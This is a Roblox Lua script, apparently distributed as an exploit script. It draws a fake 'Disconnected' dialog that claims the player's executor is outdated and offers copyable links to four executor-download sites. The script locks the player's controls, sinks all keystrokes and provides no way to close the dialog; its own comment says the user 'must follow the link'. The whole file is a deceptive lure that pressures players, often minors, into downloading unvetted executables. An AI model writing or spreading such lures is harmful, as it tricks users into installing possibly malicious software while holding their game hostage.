-- ════════════════════════════════════════════════════════
-- SERVICES
-- ════════════════════════════════════════════════════════
local Players      = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UIS          = game:GetService("UserInputService")
local Lighting     = game:GetService("Lighting")
local CoreGui      = game:GetService("CoreGui")
local GuiService   = game:GetService("GuiService")
local lp           = Players.LocalPlayer

local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled

-- ════════════════════════════════════════════════════════
-- ROBLOX-STYLE DISCONNECTED PALETTE
-- ════════════════════════════════════════════════════════
local C = {
    panel = Color3.fromRGB(44, 49, 47),
    line  = Color3.fromRGB(108, 114, 111),
    text  = Color3.fromRGB(225, 228, 226),
    sub   = Color3.fromRGB(190, 194, 192),
    field = Color3.fromRGB(58, 63, 61),
    fieldLine = Color3.fromRGB(83, 89, 86),
    white = Color3.fromRGB(245, 246, 245),
    black = Color3.fromRGB(0, 0, 0),
    accent = Color3.fromRGB(88, 170, 255),
}

-- ════════════════════════════════════════════════════════
-- MAX-CONVERSION DISCONNECT DIALOG (SIMPLIFIED)
-- ════════════════════════════════════════════════════════
local camera = workspace.CurrentCamera
local viewport = camera and camera.ViewportSize or Vector2.new(1280, 720)
local PW = isMobile and math.min(360, viewport.X - 24) or 390
local PH = isMobile and 500 or 420   -- увеличенная высота для 4 ссылок

local GUI = Instance.new("ScreenGui")
GUI.Name = "Disconnected"
GUI.ResetOnSpawn = false
GUI.IgnoreGuiInset = true
GUI.ZIndexBehavior = Enum.ZIndexBehavior.Global
GUI.DisplayOrder = 1000000
GUI.Parent = CoreGui

-- Backdrop
local Backdrop = Instance.new("Frame")
Backdrop.Size = UDim2.new(1,0,1,0)
Backdrop.BackgroundColor3 = C.black
Backdrop.BackgroundTransparency = 0.48
Backdrop.BorderSizePixel = 0
Backdrop.ZIndex = 1
Backdrop.Parent = GUI

local blur = Instance.new("BlurEffect")
blur.Name = "DisconnectedBlur"
blur.Size = 18
blur.Parent = Lighting

-- Input blocker
local InputBlocker = Instance.new("TextButton")
InputBlocker.Size = UDim2.new(1,0,1,0)
InputBlocker.BackgroundTransparency = 1
InputBlocker.BorderSizePixel = 0
InputBlocker.Text = ""
InputBlocker.AutoButtonColor = false
InputBlocker.Modal = true
InputBlocker.Active = true
InputBlocker.ZIndex = 2
InputBlocker.Parent = GUI

-- Panel
local Panel = Instance.new("Frame")
Panel.Size = UDim2.new(0, PW, 0, PH)
Panel.Position = UDim2.new(0.5, 0, 0.5, 18)
Panel.AnchorPoint = Vector2.new(0.5, 0.5)
Panel.BackgroundColor3 = C.panel
Panel.BackgroundTransparency = 1
Panel.BorderSizePixel = 0
Panel.ZIndex = 10
Panel.Parent = GUI

local panelCorner = Instance.new("UICorner")
panelCorner.CornerRadius = UDim.new(0, 1)
panelCorner.Parent = Panel

-- ════════════════════════════════════════════════════════
-- CONTENT (bold, clear, conversion-focused)
-- ════════════════════════════════════════════════════════

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1,-36,0,32)
Title.Position = UDim2.new(0,18,0,10)
Title.BackgroundTransparency = 1
Title.Text = "Executor Update Required"
Title.TextColor3 = C.text
Title.TextSize = isMobile and 18 or 20
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Center
Title.TextYAlignment = Enum.TextYAlignment.Center
Title.TextTransparency = 1
Title.ZIndex = 11
Title.Parent = Panel

-- Separator
local Separator = Instance.new("Frame")
Separator.Size = UDim2.new(1,-36,0,1)
Separator.Position = UDim2.new(0,18,0,47)
Separator.BackgroundColor3 = C.line
Separator.BackgroundTransparency = 1
Separator.BorderSizePixel = 0
Separator.ZIndex = 11
Separator.Parent = Panel

-- Main message
local Message = Instance.new("TextLabel")
Message.Size = UDim2.new(1,-40,0,44)
Message.Position = UDim2.new(0,20,0,60)
Message.BackgroundTransparency = 1
Message.Text = "Your current executor is outdated and incompatible with this script."
Message.TextColor3 = C.sub
Message.TextSize = isMobile and 14 or 16
Message.Font = Enum.Font.GothamBold
Message.TextXAlignment = Enum.TextXAlignment.Center
Message.TextYAlignment = Enum.TextYAlignment.Center
Message.TextWrapped = true
Message.TextTransparency = 1
Message.ZIndex = 11
Message.Parent = Panel

-- "Choose executor" label
local ChooseLabel = Instance.new("TextLabel")
ChooseLabel.Size = UDim2.new(1,-40,0,24)
ChooseLabel.Position = UDim2.new(0,20,0,110)
ChooseLabel.BackgroundTransparency = 1
ChooseLabel.Text = "Choose executor"
ChooseLabel.TextColor3 = C.text
ChooseLabel.TextSize = isMobile and 16 or 18
ChooseLabel.Font = Enum.Font.GothamBold
ChooseLabel.TextXAlignment = Enum.TextXAlignment.Center
ChooseLabel.TextYAlignment = Enum.TextYAlignment.Center
ChooseLabel.TextTransparency = 1
ChooseLabel.ZIndex = 11
ChooseLabel.Parent = Panel

-- ════════════════════════════════════════════════════════
-- LINK FIELDS (4 ссылки с кнопкой копирования)
-- ════════════════════════════════════════════════════════

-- Настройки ссылок: {текст, URL, y-позиция}
local linkConfigs = {
    { text = "volt-executor.cc",   url = "https://volt-executor.cc",   y = 140 },
    { text = "xeno-executor.online", url = "https://xeno-executor.online", y = 190 },
    { text = "wave-executor.xyz",  url = "https://wave-executor.xyz",  y = 240 },
    { text = "https://getsolara.world", url = "https://getsolara.world", y = 290 }, -- в самом низу
}

local linkFields = {} -- для хранения, если понадобится

-- Функция создания поля ссылки с кнопкой Copy
local function createLinkField(parent, config)
    local y = config.y
    local linkText = config.text
    local linkUrl = config.url

    local field = Instance.new("Frame")
    field.Size = UDim2.new(1,-40,0,44)
    field.Position = UDim2.new(0,20,0,y)
    field.BackgroundColor3 = C.field
    field.BackgroundTransparency = 1
    field.BorderSizePixel = 0
    field.ZIndex = 11
    field.Parent = parent

    local fieldCorner = Instance.new("UICorner")
    fieldCorner.CornerRadius = UDim.new(0, 4)
    fieldCorner.Parent = field

    local fieldStroke = Instance.new("UIStroke")
    fieldStroke.Color = C.accent
    fieldStroke.Thickness = 1.5
    fieldStroke.Transparency = 1
    fieldStroke.Parent = field

    local linkLabel = Instance.new("TextLabel")
    linkLabel.Size = UDim2.new(1,-86,1,0)
    linkLabel.Position = UDim2.new(0,12,0,0)
    linkLabel.BackgroundTransparency = 1
    linkLabel.Text = linkText
    linkLabel.TextColor3 = C.accent
    linkLabel.TextSize = isMobile and 14 or 16
    linkLabel.Font = Enum.Font.GothamBold
    linkLabel.TextXAlignment = Enum.TextXAlignment.Left
    linkLabel.TextYAlignment = Enum.TextYAlignment.Center
    linkLabel.TextTruncate = Enum.TextTruncate.AtEnd
    linkLabel.TextTransparency = 1
    linkLabel.ZIndex = 12
    linkLabel.Parent = field

    local copyBtn = Instance.new("TextButton")
    copyBtn.Size = UDim2.new(0,72,0,34)
    copyBtn.Position = UDim2.new(1,-80,0.5,-17)
    copyBtn.BackgroundColor3 = C.white
    copyBtn.BackgroundTransparency = 1
    copyBtn.BorderSizePixel = 0
    copyBtn.Text = "Copy"
    copyBtn.TextColor3 = Color3.fromRGB(45,48,47)
    copyBtn.TextSize = 14
    copyBtn.Font = Enum.Font.GothamBold
    copyBtn.AutoButtonColor = false
    copyBtn.ZIndex = 13
    copyBtn.Parent = field

    local copyCorner = Instance.new("UICorner")
    copyCorner.CornerRadius = UDim.new(0, 4)
    copyCorner.Parent = copyBtn

    -- Пульсация для привлечения внимания (только для первой кнопки?)
    local pulse = TweenService:Create(copyBtn, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
        BackgroundTransparency = 0.06
    })
    pulse:Play()

    -- Hover эффект
    copyBtn.MouseEnter:Connect(function()
        TweenService:Create(copyBtn, TweenInfo.new(0.12), {BackgroundTransparency = 0.15}):Play()
        pulse:Pause()
    end)
    copyBtn.MouseLeave:Connect(function()
        TweenService:Create(copyBtn, TweenInfo.new(0.12), {BackgroundTransparency = 0}):Play()
        pulse:Play()
    end)

    -- Функция копирования
    local function copyLink()
        local ok = false
        pcall(function()
            if setclipboard then
                setclipboard(linkUrl); ok = true
            elseif toclipboard then
                toclipboard(linkUrl); ok = true
            elseif syn and syn.set_clipboard then
                syn.set_clipboard(linkUrl); ok = true
            elseif GuiService.SetClipboard then
                GuiService:SetClipboard(linkUrl); ok = true
            end
        end)
        return ok
    end

    copyBtn.MouseButton1Click:Connect(function()
        if copyLink() then
            copyBtn.Text = "Copied!"
            copyBtn.TextColor3 = Color3.fromRGB(0,170,0)
            task.delay(1.8, function()
                if copyBtn and copyBtn.Parent then
                    copyBtn.Text = "Copy"
                    copyBtn.TextColor3 = Color3.fromRGB(45,48,47)
                end
            end)
        else
            copyBtn.Text = "Failed!"
            copyBtn.TextColor3 = Color3.fromRGB(200,0,0)
            task.delay(1.5, function()
                if copyBtn and copyBtn.Parent then
                    copyBtn.Text = "Copy"
                    copyBtn.TextColor3 = Color3.fromRGB(45,48,47)
                end
            end)
        end
    end)

    return { field = field, stroke = fieldStroke, label = linkLabel, button = copyBtn }
end

-- Создаём все поля
for _, cfg in ipairs(linkConfigs) do
    local objs = createLinkField(Panel, cfg)
    table.insert(linkFields, objs)
end

-- ════════════════════════════════════════════════════════
-- LOCK CONTROLS
-- ════════════════════════════════════════════════════════
pcall(function()
    local playerModule = lp:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")
    local controls = require(playerModule):GetControls()
    controls:Disable()
end)

local CAS = game:GetService("ContextActionService")
pcall(function()
    CAS:BindActionAtPriority(
        "Disconnected_InputLock",
        function() return Enum.ContextActionResult.Sink end,
        false,
        Enum.ContextActionPriority.High.Value,
        unpack(Enum.KeyCode:GetEnumItems())
    )
end)

-- ════════════════════════════════════════════════════════
-- SMOOTH APPEARANCE ANIMATION
-- ════════════════════════════════════════════════════════
TweenService:Create(Panel, TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
    BackgroundTransparency = 0,
    Position = UDim2.new(0.5,0,0.5,0)
}):Play()

task.wait(0.04)
TweenService:Create(Title, TweenInfo.new(0.22), {TextTransparency = 0}):Play()
task.wait(0.04)
TweenService:Create(Separator, TweenInfo.new(0.18), {BackgroundTransparency = 0}):Play()
task.wait(0.05)
TweenService:Create(Message, TweenInfo.new(0.25), {TextTransparency = 0}):Play()
task.wait(0.06)
TweenService:Create(ChooseLabel, TweenInfo.new(0.25), {TextTransparency = 0}):Play()
task.wait(0.06)

-- Анимация появления всех полей по очереди
for i, objs in ipairs(linkFields) do
    task.wait(0.06)
    TweenService:Create(objs.field, TweenInfo.new(0.25), {BackgroundTransparency = 0}):Play()
    TweenService:Create(objs.stroke, TweenInfo.new(0.25), {Transparency = 0}):Play()
    TweenService:Create(objs.label, TweenInfo.new(0.25), {TextTransparency = 0}):Play()
    TweenService:Create(objs.button, TweenInfo.new(0.25), {BackgroundTransparency = 0}):Play()
end

-- ════════════════════════════════════════════════════════
-- NO CLOSE BUTTON – USER MUST FOLLOW THE LINK
-- ════════════════════════════════════════════════════════